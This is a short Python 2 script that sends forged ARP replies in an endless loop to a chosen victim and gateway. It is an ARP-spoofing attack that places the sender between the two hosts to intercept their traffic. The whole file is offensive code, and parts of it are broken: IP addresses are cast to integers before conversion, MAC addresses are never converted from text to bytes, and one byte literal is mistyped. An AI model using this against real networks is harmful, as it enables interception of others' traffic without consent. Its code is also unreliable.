print("This program must be run on local network not remote")
print("For this mac exemple 00:0C:29:4f:8e:35")
import socket
import struct
import binascii
interface=str(raw_input("Enter your choice Interface name:"))
source=str(raw_input("Enter source MAC you want to associate of spoofing:"))
victimac=str(raw_input("Enter victim MAC adress:"))
gateway_mac=str(raw_input("Enter gateway MAC adress:"))
gateway_ip=int(raw_input("Enter Gateway IP adress:"))
victim_ip=int(raw_input("Enter victim ip adress:"))
s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x800))
s.bind((interface,socket.htons(0x0800)))
code="\x08\x06"
eth1=victimac+source+code #For victim
eth2=gateway_mac+source+code #For gateway
htype="\x00\01"
prototype="\x08\x00"
hsize="\x06"
psize="\x04"
opcode="\x00\x02"
gip=socket.inet_aton(gateway_ip)
vip=socket.inet_aton(victim_ip)
arp_victim=eth1+htype+prototype+hsize+psize+opcode+source+gip+victimac+vip
arp_gateway=eth2+htype+prototype+hsize+psize+opcode+source+vip+gateway_mac+gip
while 1:
  s.send(arp_victim)
  s.send(arp_gateway)